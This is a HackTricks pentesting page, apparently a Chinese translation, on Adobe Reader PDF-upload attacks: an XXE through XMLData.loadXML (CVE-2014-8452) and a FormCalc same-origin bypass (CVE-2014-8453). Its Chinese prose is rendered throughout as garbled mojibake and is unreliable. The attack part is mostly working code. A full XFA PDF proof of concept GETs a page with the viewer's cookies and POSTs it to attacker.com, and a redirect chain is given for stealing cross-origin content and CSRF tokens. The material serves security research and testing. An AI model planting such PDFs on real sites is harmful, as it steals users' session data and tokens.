# PDFä¸Šä¼  - XXEå’ŒCORSç»•è¿‡

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“ - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricksä»“åº“](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloudä»“åº“](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

#### å†…å®¹æ¥è‡ª[https://insert-script.blogspot.com/2014/12/multiple-pdf-vulnerabilites-text-and.html](https://insert-script.blogspot.com/2014/12/multiple-pdf-vulnerabilites-text-and.html)

### Readerä¸­çš„Javascriptå‡½æ•°å¯ç”¨äºä»å¤–éƒ¨å®ä½“è¯»å–æ•°æ® (CVE-2014-8452)

çŠ¶æ€: å·²ä¿®å¤\
å®é™…æƒ…å†µ: æœªä¿®å¤\
\
è¿™ä¸ªæ¼æ´æ˜¯å…³äºæˆ‘å‘ç°çš„ä¸€ä¸ªç®€å•çš„XXEæ¼æ´ã€‚\
æˆ‘é˜…è¯»äº†è®ºæ–‡"Polyglots: Crossing Origins by Crossing Formats"ï¼Œå…¶ä¸­è®¨è®ºäº†XMLData.parseä¸­çš„ä¸€ä¸ªæ¼æ´ã€‚å¯ä»¥ä½¿ç”¨å¤–éƒ¨å®ä½“å¹¶å¼•ç”¨å®ƒä»¬ã€‚\
æˆ‘é˜…è¯»äº†è§„èŒƒï¼Œå‘ç°é™¤äº†"parse"ä¹‹å¤–è¿˜æœ‰æ›´å¤šç”¨äºè¯»å–XMLçš„å‡½æ•°ã€‚\
æˆ‘åˆ›å»ºäº†ä¸€ä¸ªç®€å•çš„XMLæ–‡ä»¶ï¼Œå¼•ç”¨äº†åŒä¸€åŸŸä¸­çš„ä¸€ä¸ªURLï¼Œå¹¶ä½¿ç”¨loadXMLè§£æå®ƒã€‚\
å®ƒèµ·ä½œç”¨äº†ï¼š

![](https://4.bp.blogspot.com/-is4Q5hSZk-Y/VIwdzdAckWI/AAAAAAAAACI/OAzBs9Q-T50/s1600/xxe.png)
```
7 0 obj
<<
/Type /Action
/S /JavaScript
/JS (
var cXMLDoc = '<?xml version="1.0" encoding="ISO-8859-1"?><foo>muh</foo>'
var cXMLDoc2 = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ENTITY aaaa SYSTEM "http://example.com">]><ab>&aaaa;</ab>'
xml = XMLData.parse(cXMLDoc,false);
xml.loadXML(cXMLDoc2,false,true);
)
>>
endobj
```
\
å½±å“æœ‰é™ï¼Œå› ä¸ºï¼š
oï¼‰ä»…é™äºåŒæº
oï¼‰HTMLé¡µé¢ä¼šç ´åXML
oï¼‰ä¸æ”¯æŒåŠ¨æ€å®ä½“
oï¼‰æˆ‘æ›¾ç»æƒ³è¿‡ä½¿ç”¨utf-16çš„XMLæ¥é¿å…ç ´åXMLç»“æ„ï¼Œä½†æ˜¯æ²¡æœ‰æˆåŠŸã€‚

ä½†æ˜¯å®ƒä»ç„¶å¯ä»¥ç”¨æ¥è¯»å–JSONã€‚

### Readerä¸­çš„åŒæºç­–ç•¥ç»•è¿‡ï¼ˆCVE-2014-8453ï¼‰

çŠ¶æ€ï¼šå·²ä¿®å¤
å®é™…æƒ…å†µï¼šå·²ä¿®å¤ï¼Œä½†åŒæºä»ç„¶å­˜åœ¨æ¼æ´ï¼

åœ¨æˆ‘çœ‹æ¥ï¼Œè¿™æ˜¯æœ€å¼ºå¤§çš„æ¼æ´ã€‚å³ä½¿æ²¡æœ‰åŒæºç»•è¿‡ï¼Œå®ƒä¹Ÿå±•ç¤ºäº†PDFçš„å¼ºå¤§å’Œå¯æ€•ä¹‹å¤„ã€‚
å¾ˆå¤šäººçŸ¥é“PDFæ”¯æŒä¸€ç§åä¸ºJavascriptçš„è„šæœ¬è¯­è¨€ï¼Œä½†è¿˜æœ‰å¦ä¸€ç§ã€‚
åœ¨Adobe Readeræ”¯æŒçš„æ–‡ä»¶ç±»å‹XFAçš„è§„èŒƒä¸­æåˆ°äº†å®ƒã€‚
å®ƒè¢«ç§°ä¸ºformcalcï¼Œå®ƒçš„åŠŸèƒ½ä¸æ˜¯å¾ˆå¼ºå¤§ã€‚å®ƒç”¨äºç®€å•çš„æ•°å­¦è®¡ç®—ã€‚ä½†åœ¨Adobeçš„è§„èŒƒä¸­ï¼Œ
è¿˜æœ‰ä¸‰ä¸ªé¢å¤–çš„å‡½æ•°ï¼š'GET'ï¼Œ'POST'å’Œ'PUT'ã€‚æ˜¯çš„ï¼Œå®ƒä»¬çš„åå­—è¯´æ˜äº†ä¸€åˆ‡ã€‚
'GET'æœ‰ä¸€ä¸ªå‚æ•°ï¼šä¸€ä¸ªURLã€‚å®ƒå°†ä½¿ç”¨æµè§ˆå™¨ï¼ˆæ˜¯çš„ï¼ŒåŒ…æ‹¬Cookiesï¼‰æ¥æ£€ç´¢URLå¹¶è¿”å›å…¶å†…å®¹ã€‚
ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨'POST'å°†è¿”å›çš„å†…å®¹å‘é€åˆ°æˆ‘ä»¬è‡ªå·±çš„æœåŠ¡å™¨ï¼š

var content = GET("myfriends.php");
Post("http://attacker.com",content);

è¿™äº›å‡½æ•°æ˜¯åŒæºçš„ï¼Œæ‰€ä»¥ä¸€ä¸ªç½‘ç«™éœ€è¦å…è®¸æˆ‘ä»¬ä¸Šä¼ PDFã€‚å¯¹äºå¤§å¤šæ•°ç½‘ç«™æ¥è¯´ï¼Œè¿™å¹¶ä¸æ˜¯é‚£ä¹ˆä¸åˆ‡å®é™…ã€‚
attacker.comä¸æ˜¯åŒæºçš„ï¼Œæ‰€ä»¥ä½ éœ€è¦è®¾ç½®ä¸€ä¸ªcrossdomain.xmlï¼Œå°±åƒAdobeäº§å“ä¸€æ ·ã€‚

æ€»ç»“ä¸€ä¸‹ï¼šè¿™ä¸æ˜¯ä¸€ä¸ªbugï¼Œè¿™æ˜¯ä¸€ä¸ªåŠŸèƒ½ã€‚ä¸€æ—¦ä½ è¢«å…è®¸åœ¨ç½‘ç«™ä¸Šä¸Šä¼ PDFï¼Œ
ä½ å°±å¯ä»¥åœ¨æŸ¥çœ‹PDFçš„ç”¨æˆ·çš„ä¸Šä¸‹æ–‡ä¸­è®¿é—®è¯¥ç½‘ç«™ã€‚å› ä¸ºè¯·æ±‚æ˜¯ç”±æµè§ˆå™¨å‘å‡ºçš„ï¼Œæ‰€ä»¥Cookiesä¹Ÿä¼šè¢«å‘é€ã€‚ä½ è¿˜å¯ä»¥ä½¿ç”¨å®ƒæ¥çªç ´ä»»ä½•é€šè¿‡è¯»å–ä»¤ç‰Œæ¥ä¿æŠ¤çš„CSRFä¿æŠ¤æœºåˆ¶ã€‚
```
% a PDF file using an XFA
% most whitespace can be removed (truncated to 570 bytes or so...)
% Ange Albertini BSD Licence 2012

% modified by insertscript

%PDF-1. % can be truncated to %PDF-\0

1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
<interactive>1</interactive>
</pdf></present></config>
<template>
<subform name="_">
<pageSet/>
<field id="Hello World!">
<event activity="initialize">
<script contentType='application/x-formcalc'>
var content = GET("myfriends.php");
Post("http://attacker.com",content);
</script>
</event>
</field>
</subform>
</template>
</xdp:xdp>
endstream
endobj

trailer <<
/Root <<
/AcroForm <<
/Fields [<<
/T (0)
/Kids [<<
/Subtype /Widget
/Rect []
/T ()
/FT /Btn
>>]
>>]
/XFA 1 0 R
>>
/Pages <<>>
>>
>>
```
åœ¨æ‰¾åˆ°è¿™äº›åŠŸèƒ½ä¹‹åï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªåŒæºç­–ç•¥ç»•è¿‡æ–¹æ³•ã€‚è¿™ä½¿å¾—å¯ä»¥å°†å—å®³è€…çš„æµè§ˆå™¨ç”¨ä½œä»£ç†ï¼ˆ@beefä»åœ¨å¼€å‘æ¨¡å—^^ï¼‰ã€‚

ç»•è¿‡æ–¹æ³•éå¸¸ç®€å•ï¼š

1. ç”¨æˆ·Aä»http://attacker.com/evil.pdfåŠ è½½evil.pdfã€‚
2. Evil.pdfä½¿ç”¨formcalc GETæ¥è¯»å–http://attacker.com/redirect.phpã€‚
3. redirect.phpä½¿ç”¨301é‡å®šå‘åˆ°http://facebook.comã€‚
4. Adobe Readerä¼šè·Ÿéšé‡å®šå‘å¹¶è¯»å–å“åº”ï¼Œè€Œä¸ä¼šæŸ¥æ‰¾crossdomain.xmlã€‚
5. evil.pdfé€šè¿‡POSTå°†æ£€ç´¢åˆ°çš„å†…å®¹å‘é€åˆ°http://attacker.com/log.phpã€‚

è¯·æ³¨æ„ï¼Œä½¿ç”¨æ­¤æŠ€æœ¯å¯ä»¥çªƒå–é¡µé¢çš„CSRFä»¤ç‰Œå¹¶æ»¥ç”¨CSRFæ¼æ´ã€‚

è¿™ä¸ªç®€å•çš„ç»•è¿‡æ–¹æ³•ç°åœ¨å·²ç»ä¿®å¤äº†ã€‚æˆ‘å¸Œæœ›ä»–ä»¬ä¹Ÿèƒ½å®ç°å¯¹åŒæºè¯·æ±‚çš„å¯¹è¯æ¡†è­¦å‘Šã€‚

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**ä¸ºä½ çš„å…¬å¸åšå¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„PEASSæˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
